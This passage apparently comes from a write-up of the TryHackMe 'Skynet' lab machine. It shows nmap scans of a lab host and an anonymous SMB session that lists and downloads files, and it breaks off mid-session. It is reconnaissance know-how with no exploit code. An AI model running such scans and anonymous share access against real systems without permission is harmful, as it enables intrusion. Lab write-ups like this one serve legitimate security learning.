+	fr--r--r--          <span style="color:#ae81ff">7734865</span> Wed Sep <span style="color:#ae81ff">18</span> 00:40:02 2019	Machine Learning - Hands-On <span style="color:#66d9ef">for</span> Developers and Technical Professionals.pdf
+	fr--r--r--         <span style="color:#ae81ff">25159026</span> Wed Sep <span style="color:#ae81ff">18</span> 00:40:02 2019	Machine Learning <span style="color:#66d9ef">for</span> Developers.pdf
+	fr--r--r--          <span style="color:#ae81ff">7483357</span> Wed Sep <span style="color:#ae81ff">18</span> 00:40:05 2019	Python <span style="color:#66d9ef">for</span> Probability, Statistics, and Machine Learning.pdf
+	fr--r--r--          <span style="color:#ae81ff">2976969</span> Wed Sep <span style="color:#ae81ff">18</span> 00:40:02 2019	A Course in Machine Learning.pdf
+	fr--r--r--          <span style="color:#ae81ff">6084041</span> Wed Sep <span style="color:#ae81ff">18</span> 00:40:03 2019	Neural Network Programming with Java.pdf
+	fr--r--r--          <span style="color:#ae81ff">2192094</span> Wed Sep <span style="color:#ae81ff">18</span> 00:40:02 2019	Designing Machine Learning Systems with Python.pdf
+	fr--r--r--          <span style="color:#ae81ff">9548256</span> Wed Sep <span style="color:#ae81ff">18</span> 00:40:03 2019	Mastering .NET Machine Learning.epub
+	fr--r--r--          <span style="color:#ae81ff">8059599</span> Wed Sep <span style="color:#ae81ff">18</span> 00:40:02 2019	Learning Generative Adversarial Networks.epub
+	fr--r--r--          <span style="color:#ae81ff">4038836</span> Wed Sep <span style="color:#ae81ff">18</span> 00:40:02 2019	Learning NumPy Array.pdf
+	fr--r--r--          <span style="color:#ae81ff">4811954</span> Wed Sep <span style="color:#ae81ff">18</span> 00:40:03 2019	Machine Learning with Spark.pdf
+	fr--r--r--          <span style="color:#ae81ff">5508789</span> Wed Sep <span style="color:#ae81ff">18</span> 00:40:03 2019	Machine Learning in Java.pdf
+	fr--r--r--         <span style="color:#ae81ff">13048518</span> Wed Sep <span style="color:#ae81ff">18</span> 00:40:03 2019	Machine Learning <span style="color:#66d9ef">for</span> the Web.pdf
+	fr--r--r--         <span style="color:#ae81ff">12029934</span> Wed Sep <span style="color:#ae81ff">18</span> 00:40:02 2019	Large Scale Machine Learning with Spark.pdf
+	fr--r--r--          <span style="color:#ae81ff">6896831</span> Wed Sep <span style="color:#ae81ff">18</span> 00:40:03 2019	Machine Learning in Action.pdf
+	fr--r--r--          <span style="color:#ae81ff">2632302</span> Wed Sep <span style="color:#ae81ff">18</span> 00:40:03 2019	Practical Reinforcement Learning.epub
+	fr--r--r--          <span style="color:#ae81ff">6805939</span> Wed Sep <span style="color:#ae81ff">18</span> 00:40:02 2019	Building Machine Learning Systems with Python - Second Edition.pdf
+	fr--r--r--          <span style="color:#ae81ff">1351294</span> Wed Sep <span style="color:#ae81ff">18</span> 00:40:02 2019	Learning scikit-learn - Machine Learning in Python.pdf
+	fr--r--r--          <span style="color:#ae81ff">2912524</span> Wed Sep <span style="color:#ae81ff">18</span> 00:40:05 2019	Python Machine Learning By Example.epub
+	fr--r--r--         <span style="color:#ae81ff">14525480</span> Wed Sep <span style="color:#ae81ff">18</span> 00:40:04 2019	Python - Deeper Insights into Machine Learning.pdf
+	fr--r--r--         <span style="color:#ae81ff">10401548</span> Wed Sep <span style="color:#ae81ff">18</span> 00:40:02 2019	Machine Learning - Jason Bell.epub
+	fr--r--r--          <span style="color:#ae81ff">4578898</span> Wed Sep <span style="color:#ae81ff">18</span> 00:40:03 2019	Microsoft Azure Machine Learning.pdf
+	fr--r--r--         <span style="color:#ae81ff">23284986</span> Wed Sep <span style="color:#ae81ff">18</span> 00:40:05 2019	Python Machine Learning Cookbook.pdf
+	fr--r--r--          <span style="color:#ae81ff">2242317</span> Wed Sep <span style="color:#ae81ff">18</span> 00:40:02 2019	Advanced Machine Learning with Python.pdf
+	fr--r--r--          <span style="color:#ae81ff">7245188</span> Wed Sep <span style="color:#ae81ff">18</span> 00:40:02 2019	Machine Learning Projects <span style="color:#66d9ef">for</span> .NET Developers.pdf
+	fr--r--r--         <span style="color:#ae81ff">16075987</span> Wed Sep <span style="color:#ae81ff">18</span> 00:40:05 2019	Real-World Machine Learning.pdf
+	fr--r--r--          <span style="color:#ae81ff">7457736</span> Wed Sep <span style="color:#ae81ff">18</span> 00:40:06 2019	scikit-learn Cookbook - Second Edition.pdf
+	fr--r--r--          <span style="color:#ae81ff">4271512</span> Wed Sep <span style="color:#ae81ff">18</span> 00:40:03 2019	Mastering Machine Learning with scikit-learn - Second Edition.epub
+	fr--r--r--          <span style="color:#ae81ff">6308460</span> Wed Sep <span style="color:#ae81ff">18</span> 00:40:02 2019	Machine Learning <span style="color:#66d9ef">for</span> Email.epub
+	fr--r--r--          <span style="color:#ae81ff">8807568</span> Wed Sep <span style="color:#ae81ff">18</span> 00:40:05 2019	Thoughtful Machine Learning with Python A Test-Driven Approach.pdf
+	fr--r--r--          <span style="color:#ae81ff">1983841</span> Wed Sep <span style="color:#ae81ff">18</span> 00:40:06 2019	Using Python to Develop Analytics, Control and Machine Learning Products.pdf
+	fr--r--r--          <span style="color:#ae81ff">3558541</span> Wed Sep <span style="color:#ae81ff">18</span> 00:40:02 2019	Building Intelligent Systems - A Guide to Machine Learning Engineering.pdf
+	fr--r--r--          <span style="color:#ae81ff">1617724</span> Wed Sep <span style="color:#ae81ff">18</span> 00:40:06 2019	What You Need to Know about R.pdf
+	fr--r--r--          <span style="color:#ae81ff">8908750</span> Wed Sep <span style="color:#ae81ff">18</span> 00:40:03 2019	Practical Machine Learning with H2O - Powerful, Scalable Techniques <span style="color:#66d9ef">for</span> Deep Learning and AI.pdf
+	fr--r--r--         <span style="color:#ae81ff">14065243</span> Wed Sep <span style="color:#ae81ff">18</span> 00:40:03 2019	Machine Learning in Action - 中文版.pdf
+	fr--r--r--         <span style="color:#ae81ff">24204134</span> Wed Sep <span style="color:#ae81ff">18</span> 00:40:03 2019	Machine Learning <span style="color:#66d9ef">for</span> Hackers.pdf
+	fr--r--r--          <span style="color:#ae81ff">6656692</span> Wed Sep <span style="color:#ae81ff">18</span> 00:40:05 2019	Python Machine Learning Cookbook - Early Release.pdf
+	milesdyson                                        	NO ACCESS	Miles Dyson Personal Share
+	IPC$                                              	NO ACCESS	IPC Service <span style="color:#f92672">(</span>skynet server <span style="color:#f92672">(</span>Samba, Ubuntu<span style="color:#f92672">))</span>
+<span style="color:#f92672">[</span><span style="color:#ae81ff">\]</span> Working on it...
+</code></pre></div><p>Let&rsquo;s see what ssh nmap scan returned:</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-sh" data-lang="sh"><span style="color:#75715e"># Nmap 7.80 scan initiated Mon Aug 24 20:27:47 2020 as: nmap -vv --reason -Pn -sV -p 22 --script=banner,ssh2-enum-algos,ssh-hostkey,ssh-auth-methods -oN /home/kali/results/10.10.128.90/scans/tcp_22_ssh_nmap.txt -oX /home/kali/results/10.10.128.90/scans/xml/tcp_22_ssh_nmap.xml 10.10.128.90</span>
+Nmap scan report <span style="color:#66d9ef">for</span> 10.10.128.90
+Host is up, received user-set <span style="color:#f92672">(</span>0.36s latency<span style="color:#f92672">)</span>.
+Scanned at 2020-08-24 20:27:47 EDT <span style="color:#66d9ef">for</span> 11s
+
+PORT   STATE SERVICE REASON  VERSION
+22/tcp open  ssh     syn-ack OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 <span style="color:#f92672">(</span>Ubuntu Linux; protocol 2.0<span style="color:#f92672">)</span>
+|_banner: SSH-2.0-OpenSSH_7.2p2 Ubuntu-4ubuntu2.8
+| ssh-auth-methods: 
+|   Supported authentication methods: 
+|     publickey
+|_    password
+| ssh-hostkey: 
+|   <span style="color:#ae81ff">2048</span> 99:23:31:bb:b1:e9:43:b7:56:94:4c:b9:e8:21:46:c5 <span style="color:#f92672">(</span>RSA<span style="color:#f92672">)</span>
+| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDKeTyrvAfbRB4onlz23fmgH5DPnSz07voOYaVMKPx5bT62zn7eZzecIVvfp5LBCetcOyiw2Yhocs0oO1/RZSqXlwTVzRNKzznG4WTPtkvD7ws/4tv2cAGy1lzRy9b+361HHIXT8GNteq2mU+boz3kdZiiZHIml4oSGhI+/+IuSMl5clB5/FzKJ+mfmu4MRS8iahHlTciFlCpmQvoQFTA5s2PyzDHM6XjDYH1N3Euhk4xz44Xpo1hUZnu+P975/GadIkhr/Y0N5Sev+Kgso241/v0GQ2lKrYz3RPgmNv93AIQ4t3i3P6qDnta/06bfYDSEEJXaON+A9SCpk2YSrj4A7
+|   <span style="color:#ae81ff">256</span> 57:c0:75:02:71:2d:19:31:83:db:e4:fe:67:96:68:cf <span style="color:#f92672">(</span>ECDSA<span style="color:#f92672">)</span>
+| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBI0UWS0x1ZsOGo510tgfVbNVhdE5LkzA4SWDW/5UjDumVQ7zIyWdstNAm+lkpZ23Iz3t8joaLcfs8nYCpMGa/xk<span style="color:#f92672">=</span>
+|   <span style="color:#ae81ff">256</span> 46:fa:4e:fc:10:a5:4f:57:57:d0:6d:54:f6:c3:4d:fe <span style="color:#f92672">(</span>ED25519<span style="color:#f92672">)</span>
+|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAICHVctcvlD2YZ4mLdmUlSwY8Ro0hCDMKGqZ2+DuI0KFQ
+| ssh2-enum-algos: 
+|   kex_algorithms: <span style="color:#f92672">(</span>6<span style="color:#f92672">)</span>
+|       curve25519-sha256@libssh.org
+|       ecdh-sha2-nistp256
+|       ecdh-sha2-nistp384
+|       ecdh-sha2-nistp521
+|       diffie-hellman-group-exchange-sha256
+|       diffie-hellman-group14-sha1
+|   server_host_key_algorithms: <span style="color:#f92672">(</span>5<span style="color:#f92672">)</span>
+|       ssh-rsa
+|       rsa-sha2-512
+|       rsa-sha2-256
+|       ecdsa-sha2-nistp256
+|       ssh-ed25519
+|   encryption_algorithms: <span style="color:#f92672">(</span>6<span style="color:#f92672">)</span>
+|       chacha20-poly1305@openssh.com
+|       aes128-ctr
+|       aes192-ctr
+|       aes256-ctr
+|       aes128-gcm@openssh.com
+|       aes256-gcm@openssh.com
+|   mac_algorithms: <span style="color:#f92672">(</span>10<span style="color:#f92672">)</span>
+|       umac-64-etm@openssh.com
+|       umac-128-etm@openssh.com
+|       hmac-sha2-256-etm@openssh.com
+|       hmac-sha2-512-etm@openssh.com
+|       hmac-sha1-etm@openssh.com
+|       umac-64@openssh.com
+|       umac-128@openssh.com
+|       hmac-sha2-256
+|       hmac-sha2-512
+|       hmac-sha1
+|   compression_algorithms: <span style="color:#f92672">(</span>2<span style="color:#f92672">)</span>
+|       none
+|_      zlib@openssh.com
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+Read data files from: /usr/bin/../share/nmap
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+<span style="color:#75715e"># Nmap done at Mon Aug 24 20:27:58 2020 -- 1 IP address (1 host up) scanned in 11.46 seconds</span>
+</code></pre></div><p>We also get another set of results back from nmap on port 80:</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-sh" data-lang="sh"><span style="color:#75715e"># Nmap 7.80 scan initiated Mon Aug 24 20:27:47 2020 as: nmap -vv --reason -Pn -sV -p 80 &#34;--script=banner,(http* or ssl*) and not (brute or broadcast or dos or external or http-slowloris* or fuzzer)&#34; -oN /home/kali/results/10.10.128.90/scans/tcp_80_http_nmap.txt -oX /home/kali/results/10.10.128.90/scans/xml/tcp_80_http_nmap.xml 10.10.128.90</span>
+Nmap scan report <span style="color:#66d9ef">for</span> 10.10.128.90
+Host is up, received user-set <span style="color:#f92672">(</span>0.36s latency<span style="color:#f92672">)</span>.
+Scanned at 2020-08-24 20:27:47 EDT <span style="color:#66d9ef">for</span> 173s
+
+PORT   STATE SERVICE REASON  VERSION
+80/tcp open  http    syn-ack Apache httpd 2.4.18 <span style="color:#f92672">((</span>Ubuntu<span style="color:#f92672">))</span>
+|_http-chrono: Request times <span style="color:#66d9ef">for</span> /; avg: 798.45ms; min: 774.45ms; max: 828.46ms
+|_http-comments-displayer: Couldn<span style="color:#e6db74">&#39;t find any comments.
+</span><span style="color:#e6db74">| http-csrf: 
+</span><span style="color:#e6db74">| Spidering limited to: maxdepth=3; maxpagecount=20; withinhost=10.10.128.90
+</span><span style="color:#e6db74">|   Found the following possible CSRF vulnerabilities: 
+</span><span style="color:#e6db74">|     
+</span><span style="color:#e6db74">|     Path: http://10.10.128.90:80/
+</span><span style="color:#e6db74">|     Form id: 
+</span><span style="color:#e6db74">|_    Form action: #
+</span><span style="color:#e6db74">|_http-date: Tue, 25 Aug 2020 00:28:25 GMT; +30s from local time.
+</span><span style="color:#e6db74">|_http-devframework: Couldn&#39;</span>t determine the underlying framework or CMS. Try increasing <span style="color:#e6db74">&#39;httpspider.maxpagecount&#39;</span> value to spider more pages.
+|_http-dombased-xss: Couldn<span style="color:#e6db74">&#39;t find any DOM based XSS.
+</span><span style="color:#e6db74">|_http-drupal-enum: Nothing found amongst the top 100 resources,use --script-args number=&lt;number|all&gt; for deeper analysis)
+</span><span style="color:#e6db74">| http-enum: 
+</span><span style="color:#e6db74">|   /squirrelmail/src/login.php: squirrelmail version 1.4.23 [svn]
+</span><span style="color:#e6db74">|_  /squirrelmail/images/sm_logo.png: SquirrelMail
+</span><span style="color:#e6db74">| http-errors: 
+</span><span style="color:#e6db74">| Spidering limited to: maxpagecount=40; withinhost=10.10.128.90
+</span><span style="color:#e6db74">|   Found the following error pages: 
+</span><span style="color:#e6db74">|   
+</span><span style="color:#e6db74">|   Error Code: 404
+</span><span style="color:#e6db74">|_  	http://10.10.128.90:80/favicon.ico
+</span><span style="color:#e6db74">|_http-feed: Couldn&#39;</span>t find any feeds.
+|_http-fetch: Please enter the complete path of the directory to save data in.
+| http-grep: 
+|   <span style="color:#f92672">(</span>1<span style="color:#f92672">)</span> http://10.10.128.90:80/favicon.ico: 
+|     <span style="color:#f92672">(</span>1<span style="color:#f92672">)</span> ip: 
+|_      + 10.10.128.90
+| http-headers: 
+|   Date: Tue, <span style="color:#ae81ff">25</span> Aug <span style="color:#ae81ff">2020</span> 00:28:28 GMT
+|   Server: Apache/2.4.18 <span style="color:#f92672">(</span>Ubuntu<span style="color:#f92672">)</span>
+|   Last-Modified: Tue, <span style="color:#ae81ff">17</span> Sep <span style="color:#ae81ff">2019</span> 08:58:28 GMT
+|   ETag: <span style="color:#e6db74">&#34;20b-592bbec81c0b6&#34;</span>
+|   Accept-Ranges: bytes
+|   Content-Length: <span style="color:#ae81ff">523</span>
+|   Vary: Accept-Encoding
+|   Connection: close
+|   Content-Type: text/html
+|   
+|_  <span style="color:#f92672">(</span>Request type: HEAD<span style="color:#f92672">)</span>
+|_http-jsonp-detection: Couldn<span style="color:#e6db74">&#39;t find any JSONP endpoints.
+</span><span style="color:#e6db74">|_http-litespeed-sourcecode-download: Request with null byte did not work. This web server might not be vulnerable
+</span><span style="color:#e6db74">|_http-malware-host: Host appears to be clean
+</span><span style="color:#e6db74">| http-methods: 
+</span><span style="color:#e6db74">|_  Supported Methods: GET HEAD POST OPTIONS
+</span><span style="color:#e6db74">|_http-mobileversion-checker: No mobile version detected.
+</span><span style="color:#e6db74">| http-php-version: Logo query returned unknown hash 9d7adb7aa48bcf25afd6593b7df1aacd
+</span><span style="color:#e6db74">|_Credits query returned unknown hash 9d7adb7aa48bcf25afd6593b7df1aacd
+</span><span style="color:#e6db74">|_http-referer-checker: Couldn&#39;</span>t find any cross-domain scripts.
+|_http-security-headers: 
+| http-sitemap-generator: 
+|   Directory structure:
+|     /
+|       Other: 1; css: 1; png: <span style="color:#ae81ff">1</span>
+|   Longest directory structure:
+|     Depth: <span style="color:#ae81ff">0</span>
+|     Dir: /
+|   Total files found <span style="color:#f92672">(</span>by extension<span style="color:#f92672">)</span>:
+|_    Other: 1; css: 1; png: <span style="color:#ae81ff">1</span>
+|_http-stored-xss: Couldn<span style="color:#e6db74">&#39;t find any stored XSS vulnerabilities.
+</span><span style="color:#e6db74">|_http-title: Skynet
+</span><span style="color:#e6db74">| http-useragent-tester: 
+</span><span style="color:#e6db74">|   Status for browser useragent: 200
+</span><span style="color:#e6db74">|   Allowed User Agents: 
+</span><span style="color:#e6db74">|     Mozilla/5.0 (compatible; Nmap Scripting Engine; https://nmap.org/book/nse.html)
+</span><span style="color:#e6db74">|     libwww
+</span><span style="color:#e6db74">|     lwp-trivial
+</span><span style="color:#e6db74">|     libcurl-agent/1.0
+</span><span style="color:#e6db74">|     PHP/
+</span><span style="color:#e6db74">|     Python-urllib/2.5
+</span><span style="color:#e6db74">|     GT::WWW
+</span><span style="color:#e6db74">|     Snoopy
+</span><span style="color:#e6db74">|     MFC_Tear_Sample
+</span><span style="color:#e6db74">|     HTTP::Lite
+</span><span style="color:#e6db74">|     PHPCrawl
+</span><span style="color:#e6db74">|     URI::Fetch
+</span><span style="color:#e6db74">|     Zend_Http_Client
+</span><span style="color:#e6db74">|     http client
+</span><span style="color:#e6db74">|     PECL::HTTP
+</span><span style="color:#e6db74">|     Wget/1.13.4 (linux-gnu)
+</span><span style="color:#e6db74">|_    WWW-Mechanize/1.34
+</span><span style="color:#e6db74">| http-vhosts: 
+</span><span style="color:#e6db74">|_127 names had status 200
+</span><span style="color:#e6db74">|_http-wordpress-enum: Nothing found amongst the top 100 resources,use --script-args search-limit=&lt;number|all&gt; for deeper analysis)
+</span><span style="color:#e6db74">|_http-wordpress-users: [Error] Wordpress installation was not found. We couldn&#39;</span>t find wp-login.php
+
+Read data files from: /usr/bin/../share/nmap
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+<span style="color:#75715e"># Nmap done at Mon Aug 24 20:30:40 2020 -- 1 IP address (1 host up) scanned in 173.37 seconds</span>
+</code></pre></div><p>And we can see some of this summarized on the quick tcp nmap scan results:</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-sh" data-lang="sh"><span style="color:#75715e"># Nmap 7.80 scan initiated Mon Aug 24 20:25:19 2020 as: nmap -vv --reason -Pn -sV -sC --version-all -oN /home/kali/results/10.10.128.90/scans/_quick_tcp_nmap.txt -oX /home/kali/results/10.10.128.90/scans/xml/_quick_tcp_nmap.xml 10.10.128.90</span>
+Nmap scan report <span style="color:#66d9ef">for</span> 10.10.128.90
+Host is up, received user-set <span style="color:#f92672">(</span>0.36s latency<span style="color:#f92672">)</span>.
+Scanned at 2020-08-24 20:25:20 EDT <span style="color:#66d9ef">for</span> 146s
+Not shown: <span style="color:#ae81ff">994</span> closed ports
+Reason: <span style="color:#ae81ff">994</span> conn-refused
+PORT    STATE SERVICE     REASON  VERSION
+22/tcp  open  ssh         syn-ack OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 <span style="color:#f92672">(</span>Ubuntu Linux; protocol 2.0<span style="color:#f92672">)</span>
+| ssh-hostkey: 
+|   <span style="color:#ae81ff">2048</span> 99:23:31:bb:b1:e9:43:b7:56:94:4c:b9:e8:21:46:c5 <span style="color:#f92672">(</span>RSA<span style="color:#f92672">)</span>
+| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDKeTyrvAfbRB4onlz23fmgH5DPnSz07voOYaVMKPx5bT62zn7eZzecIVvfp5LBCetcOyiw2Yhocs0oO1/RZSqXlwTVzRNKzznG4WTPtkvD7ws/4tv2cAGy1lzRy9b+361HHIXT8GNteq2mU+boz3kdZiiZHIml4oSGhI+/+IuSMl5clB5/FzKJ+mfmu4MRS8iahHlTciFlCpmQvoQFTA5s2PyzDHM6XjDYH1N3Euhk4xz44Xpo1hUZnu+P975/GadIkhr/Y0N5Sev+Kgso241/v0GQ2lKrYz3RPgmNv93AIQ4t3i3P6qDnta/06bfYDSEEJXaON+A9SCpk2YSrj4A7
+|   <span style="color:#ae81ff">256</span> 57:c0:75:02:71:2d:19:31:83:db:e4:fe:67:96:68:cf <span style="color:#f92672">(</span>ECDSA<span style="color:#f92672">)</span>
+| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBI0UWS0x1ZsOGo510tgfVbNVhdE5LkzA4SWDW/5UjDumVQ7zIyWdstNAm+lkpZ23Iz3t8joaLcfs8nYCpMGa/xk<span style="color:#f92672">=</span>
+|   <span style="color:#ae81ff">256</span> 46:fa:4e:fc:10:a5:4f:57:57:d0:6d:54:f6:c3:4d:fe <span style="color:#f92672">(</span>ED25519<span style="color:#f92672">)</span>
+|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAICHVctcvlD2YZ4mLdmUlSwY8Ro0hCDMKGqZ2+DuI0KFQ
+80/tcp  open  http        syn-ack Apache httpd 2.4.18 <span style="color:#f92672">((</span>Ubuntu<span style="color:#f92672">))</span>
+| http-methods: 
+|_  Supported Methods: GET HEAD POST OPTIONS
+|_http-server-header: Apache/2.4.18 <span style="color:#f92672">(</span>Ubuntu<span style="color:#f92672">)</span>
+|_http-title: Skynet
+110/tcp open  pop3        syn-ack Dovecot pop3d
+|_pop3-capabilities: SASL TOP CAPA RESP-CODES PIPELINING UIDL AUTH-RESP-CODE
+139/tcp open  netbios-ssn syn-ack Samba smbd 3.X - 4.X <span style="color:#f92672">(</span>workgroup: WORKGROUP<span style="color:#f92672">)</span>
+143/tcp open  imap        syn-ack Dovecot imapd
+|_imap-capabilities: LOGIN-REFERRALS ENABLE Pre-login SASL-IR have IDLE post-login listed OK capabilities LITERAL+ more LOGINDISABLEDA0001 ID IMAP4rev1
+445/tcp open  netbios-ssn syn-ack Samba smbd 4.3.11-Ubuntu <span style="color:#f92672">(</span>workgroup: WORKGROUP<span style="color:#f92672">)</span>
+Service Info: Host: SKYNET; OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+Host script results:
+|_clock-skew: mean: 1h40m30s, deviation: 2h53m12s, median: 29s
+| nbstat: NetBIOS name: SKYNET, NetBIOS user: &lt;unknown&gt;, NetBIOS MAC: &lt;unknown&gt; <span style="color:#f92672">(</span>unknown<span style="color:#f92672">)</span>
+| Names:
+|   SKYNET&lt;00&gt;           Flags: &lt;unique&gt;&lt;active&gt;
+|   SKYNET&lt;03&gt;           Flags: &lt;unique&gt;&lt;active&gt;
+|   SKYNET&lt;20&gt;           Flags: &lt;unique&gt;&lt;active&gt;
+|   <span style="color:#ae81ff">\x</span>01<span style="color:#ae81ff">\x</span>02__MSBROWSE__<span style="color:#ae81ff">\x</span>02&lt;01&gt;  Flags: &lt;group&gt;&lt;active&gt;
+|   WORKGROUP&lt;00&gt;        Flags: &lt;group&gt;&lt;active&gt;
+|   WORKGROUP&lt;1d&gt;        Flags: &lt;unique&gt;&lt;active&gt;
+|   WORKGROUP&lt;1e&gt;        Flags: &lt;group&gt;&lt;active&gt;
+| Statistics:
+|   <span style="color:#ae81ff">00</span> <span style="color:#ae81ff">00</span> <span style="color:#ae81ff">00</span> <span style="color:#ae81ff">00</span> <span style="color:#ae81ff">00</span> <span style="color:#ae81ff">00</span> <span style="color:#ae81ff">00</span> <span style="color:#ae81ff">00</span> <span style="color:#ae81ff">00</span> <span style="color:#ae81ff">00</span> <span style="color:#ae81ff">00</span> <span style="color:#ae81ff">00</span> <span style="color:#ae81ff">00</span> <span style="color:#ae81ff">00</span> <span style="color:#ae81ff">00</span> <span style="color:#ae81ff">00</span> <span style="color:#ae81ff">00</span>
+|   <span style="color:#ae81ff">00</span> <span style="color:#ae81ff">00</span> <span style="color:#ae81ff">00</span> <span style="color:#ae81ff">00</span> <span style="color:#ae81ff">00</span> <span style="color:#ae81ff">00</span> <span style="color:#ae81ff">00</span> <span style="color:#ae81ff">00</span> <span style="color:#ae81ff">00</span> <span style="color:#ae81ff">00</span> <span style="color:#ae81ff">00</span> <span style="color:#ae81ff">00</span> <span style="color:#ae81ff">00</span> <span style="color:#ae81ff">00</span> <span style="color:#ae81ff">00</span> <span style="color:#ae81ff">00</span> <span style="color:#ae81ff">00</span>
+|_  <span style="color:#ae81ff">00</span> <span style="color:#ae81ff">00</span> <span style="color:#ae81ff">00</span> <span style="color:#ae81ff">00</span> <span style="color:#ae81ff">00</span> <span style="color:#ae81ff">00</span> <span style="color:#ae81ff">00</span> <span style="color:#ae81ff">00</span> <span style="color:#ae81ff">00</span> <span style="color:#ae81ff">00</span> <span style="color:#ae81ff">00</span> <span style="color:#ae81ff">00</span> <span style="color:#ae81ff">00</span> <span style="color:#ae81ff">00</span>
+| p2p-conficker: 
+|   Checking <span style="color:#66d9ef">for</span> Conficker.C or higher...
+|   Check <span style="color:#ae81ff">1</span> <span style="color:#f92672">(</span>port 5983/tcp<span style="color:#f92672">)</span>: CLEAN <span style="color:#f92672">(</span>Couldn<span style="color:#e6db74">&#39;t connect)
+</span><span style="color:#e6db74">|   Check 2 (port 42355/tcp): CLEAN (Couldn&#39;</span>t connect<span style="color:#f92672">)</span>
+|   Check <span style="color:#ae81ff">3</span> <span style="color:#f92672">(</span>port 54521/udp<span style="color:#f92672">)</span>: CLEAN <span style="color:#f92672">(</span>Failed to receive data<span style="color:#f92672">)</span>
+|   Check <span style="color:#ae81ff">4</span> <span style="color:#f92672">(</span>port 45683/udp<span style="color:#f92672">)</span>: CLEAN <span style="color:#f92672">(</span>Failed to receive data<span style="color:#f92672">)</span>
+|_  0/4 checks are positive: Host is CLEAN or ports are blocked
+| smb-os-discovery: 
+|   OS: Windows 6.1 <span style="color:#f92672">(</span>Samba 4.3.11-Ubuntu<span style="color:#f92672">)</span>
+|   Computer name: skynet
+|   NetBIOS computer name: SKYNET<span style="color:#ae81ff">\x</span><span style="color:#ae81ff">00</span>
+|   Domain name: <span style="color:#ae81ff">\x</span><span style="color:#ae81ff">00</span>
+|   FQDN: skynet
+|_  System time: 2020-08-24T19:28:04-05:00
+| smb-security-mode: 
+|   account_used: guest
+|   authentication_level: user
+|   challenge_response: supported
+|_  message_signing: disabled <span style="color:#f92672">(</span>dangerous, but default<span style="color:#f92672">)</span>
+| smb2-security-mode: 
+|   2.02: 
+|_    Message signing enabled but not required
+| smb2-time: 
+|   date: 2020-08-25T00:28:04
+|_  start_date: N/A
+
+Read data files from: /usr/bin/../share/nmap
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+<span style="color:#75715e"># Nmap done at Mon Aug 24 20:27:46 2020 -- 1 IP address (1 host up) scanned in 147.37 seconds</span>
+
+</code></pre></div><p>We download some files using an anonymous SMB connection:</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-sh" data-lang="sh">
+kali@kali:~/Documents/THM/skynet$ cat attention.txt 
+A recent system malfunction has caused various passwords to be changed. All skynet employees are required to change their password after seeing this.
+-Miles Dyson
+kali@kali:~/Documents/THM/skynet$ smbclient //10.10.128.90/anonymous/
+Enter WORKGROUP<span style="color:#ae81ff">\k</span>ali<span style="color:#960050;background-color:#1e0010">&#39;</span>s password: 
+Try <span style="color:#e6db74">&#34;help&#34;</span> to get a list of possible commands.
+smb: <span style="color:#ae81ff">\&gt;</span> ls -al
+NT_STATUS_NO_SUCH_FILE listing <span style="color:#ae81ff">\-</span>al
+smb: <span style="color:#ae81ff">\&gt;</span> ls
+  .                                   D        <span style="color:#ae81ff">0</span>  Wed Sep <span style="color:#ae81ff">18</span> 00:41:20 <span style="color:#ae81ff">2019</span>
+  ..                                  D        <span style="color:#ae81ff">0</span>  Tue Sep <span style="color:#ae81ff">17</span> 03:20:17 <span style="color:#ae81ff">2019</span>
+  attention.txt                       N      <span style="color:#ae81ff">163</span>  Tue Sep <span style="color:#ae81ff">17</span> 23:04:59 <span style="color:#ae81ff">2019</span>
+  logs                                D        <span style="color:#ae81ff">0</span>  Wed Sep <span style="color:#ae81ff">18</span> 00:42:16 <span style="color:#ae81ff">2019</span>
+  books                               D        <span style="color:#ae81ff">0</span>  Wed Sep <span style="color:#ae81ff">18</span> 00:40:06 <span style="color:#ae81ff">2019</span>
+
+                <span style="color:#ae81ff">9204224</span> blocks of size 1024. <span style="color:#ae81ff">5370592</span> blocks available
+smb: <span style="color:#ae81ff">\&gt;</span> get logs
+NT_STATUS_FILE_IS_A_DIRECTORY opening remote file <span style="color:#ae81ff">\l</span>ogs
+smb: <span style="color:#ae81ff">\&gt;</span> cd logs
+smb: <span style="color:#ae81ff">\l</span>ogs<span style="color:#ae81ff">\&gt;</span> ls
+  .                                   D        <span style="color:#ae81ff">0</span>  Wed Sep <span style="color:#ae81ff">18</span> 00:42:16 <span style="color:#ae81ff">2019</span>
+  ..                                  D        <span style="color:#ae81ff">0</span>  Wed Sep <span style="color:#ae81ff">18</span> 00:41:20 <span style="color:#ae81ff">2019</span>
+  log2.txt                            N        <span style="color:#ae81ff">0</span>  Wed Sep <span style="color:#ae81ff">18</span> 00:42:13 <span style="color:#ae81ff">2019</span>
+  log1.txt                            N      <span style="color:#ae81ff">471</span>  Wed Sep <span style="color:#ae81ff">18</span> 00:41:59 <span style="color:#ae81ff">2019</span>
+  log3.txt                            N        <span style="color:#ae81ff">0</span>  Wed Sep <span style="color:#ae81ff">18</span> 00:42:16 <span style="color:#ae81ff">2019</span>
+
+                <span style="color:#ae81ff">9204224</span> blocks of size 1024. <span style="color:#ae81ff">5370592</span> blocks available
+smb: <span style="color:#ae81ff">\l</span>ogs<span style="color:#ae81ff">\&gt;</span> get log1.txt
